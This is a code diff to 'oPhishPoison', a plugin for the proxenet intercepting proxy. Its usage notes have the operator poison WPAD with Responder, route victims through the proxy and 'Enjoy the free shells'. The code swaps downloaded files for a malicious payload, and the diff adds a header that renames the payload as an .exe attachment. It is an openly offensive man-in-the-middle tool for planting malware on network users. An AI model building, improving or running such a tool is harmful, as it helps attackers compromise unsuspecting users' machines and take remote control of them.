@@ -9,7 +9,7 @@ How to use:
   ex: $ ln -sf proxenet-plugins/oPhishPoison.py proxenet-plugins/autoload/oPhishPoison.py
       $ ./proxenet -b 192.168.56.1 -p 8008
 - Start Responder and point WPAD to proxenet
-  ex: # ./Responder.py -v -w -I vboxnet0 -u 192.168.56.1:8008
+  ex: # ./Responder.py -v -I vboxnet0 -u 192.168.56.1:8008
 - Enjoy the free shells
 
 """
@@ -18,7 +18,7 @@ PLUGIN_NAME   = "oPhishPoison"
 AUTHOR        = "@_hugsy_"
 
 
-import os, subprocess, ConfigParser, re
+import os, subprocess, ConfigParser, re, base64
 from pimp import HTTPResponse, HTTPBadResponseException
 
 HOME = os.getenv( "HOME" )
@@ -104,6 +104,9 @@ def replace_with_malicious(http, ctype):
     # 2.
     with open(res, "rb") as f:
         http.body = f.read()
+
+    http.del_header("Content-Disposition")
+    http.add_header("Content-Disposition", "attachment; filename=attachment.{}.exe".format(ctype))
 
     # 3.
     return True
